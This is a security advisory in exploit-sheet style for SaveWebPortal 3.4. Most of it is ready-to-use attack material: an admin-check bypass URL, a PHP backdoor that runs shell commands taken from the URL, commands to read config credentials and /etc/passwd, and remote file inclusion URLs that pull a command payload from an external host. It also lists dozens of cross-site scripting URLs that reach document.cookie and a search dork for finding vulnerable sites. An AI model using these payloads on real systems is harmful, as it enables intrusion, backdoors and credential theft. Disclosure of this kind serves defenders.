<pre>
<code><span style="font: 10pt Courier New;"><span class="general1-identifier">SaveWebPortal 3.4 remote code execution / admin check bypass / remote file
inclusion / cross site scripting 

author site: http://www.circeos.it
download page: http://www.circeos.it/frontend/index.php?page=downloads


a) remote code execution:

a user can bypass admin check, calling this url:

http://[target]/saveweb/admin/PhpMyExplorer/editerfichier.php?chemin=.&amp;fichier=header.php&amp;type=Source

now can leave a backdoor in header.php or some other file, example:

&lt;?php 
error_reporting(0);
passtrhu($HTTP_GET_VARS[command]);
?&gt;

after editing template, user can execute arbitrary system commands, through a
url like this:

http://[target]/saveweb/header.php?command=ls%20-la

to list directories...

http://[target]/saveweb/header.php?command=cat%20config.inc.php

to see database username/password and admin panel username/password 
(now attacker have full access to site configuration... can go to
http://[target]/saveweb/admin/
to login...
)

http://[target]/saveweb/header.php?command=cat%20/etc/passwd

to see passwd file...


b) arbitrary file inclusion:

a user can view any file on the target server,if not with .php extension:

http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../boot.ini%00
http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../boot.ini%00

can execute arbitrary file resident on target server, if with .php extension,
example :

http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../[script].php%00
http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../[script].php%00

can craft a malicious url to cause victim user to execute commands on external
site:

http://[target]/saveweb/menu_dx.php?SITE_Path=http://[external_site]/cmd.gif%00
http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=http://[external_site]/cmd.gif%00

where cmd.gif is a file like this:

&lt;?php system('[some command]'); ?&gt;


c) xss:

c.1)
http://[target]/saveweb/footer.php?TABLE_Width=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/footer.php?SITE_Author_Domain=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/footer.php?SITE_Author=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/footer.php?L_Info=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/footer.php?L_Help=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/header.php?TABLE_Width=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/header.php?L_Visitors=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/header.php?count=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/header.php?SITE_Logo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/header.php?BANNER_Url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;

http://[target]/saveweb/header.php?L_Sunday=&quot;}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/header.php?L_Monday=&quot;}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
and so on...

http://[target]/saveweb/header.php?L_January=&quot;}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/header.php?L_February=&quot;}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
and so on...

http://[target]/saveweb/header.php?IMAGES_Url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/header.php?L_Info=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/header.php?L_Help=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--

http://[target]/saveweb/menu_dx.php?L_InsertCorrectly=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_dx.php?L_MENUDX_Login=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/menu_dx.php?L_MENUDX_Username=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/menu_dx.php?L_MENUDX_Password=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/menu_dx.php?L_Ok=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/menu_dx.php?IMAGES_Url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/menu_dx.php?L_MENUDX_Registration=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/menu_dx.php?BANNER_Url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/menu_dx.php?L_MENUSX_Newsletter=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
http://[target]/saveweb/menu_dx.php?L_MENUDX_InsertEMail=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--

http://[target]/saveweb/menu_sx.php?L_InsertNOK3Char=&quot;);}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Channels=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Home=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Archive=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_Search=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_Ok=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?IMAGES_Url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Services=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Links=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Newsletter=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Polls=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_ECards=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Downloads=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Community=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Forum=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Chat=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Nicknames=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Membership=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Login=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_UserProfile=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_PasswordForgot=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Logout=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Contacts=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_Guestbook=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://[target]/saveweb/menu_sx.php?L_MENUSX_ContactUs=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;

c.2) a user can inject evil javascript code in HTTP_REFERER and HTTP_USER_AGENT
vars, when admin view logs javascript will be executed


googledork: &quot;powered by ITWorking&quot;

rgod
mail: retrogod at aliceposta it
site: http://rgod.altervista.org

original advisory: http://rgod.altervista.org/save_yourself_from_savewebportal34.html
</span></span>
</code></pre>
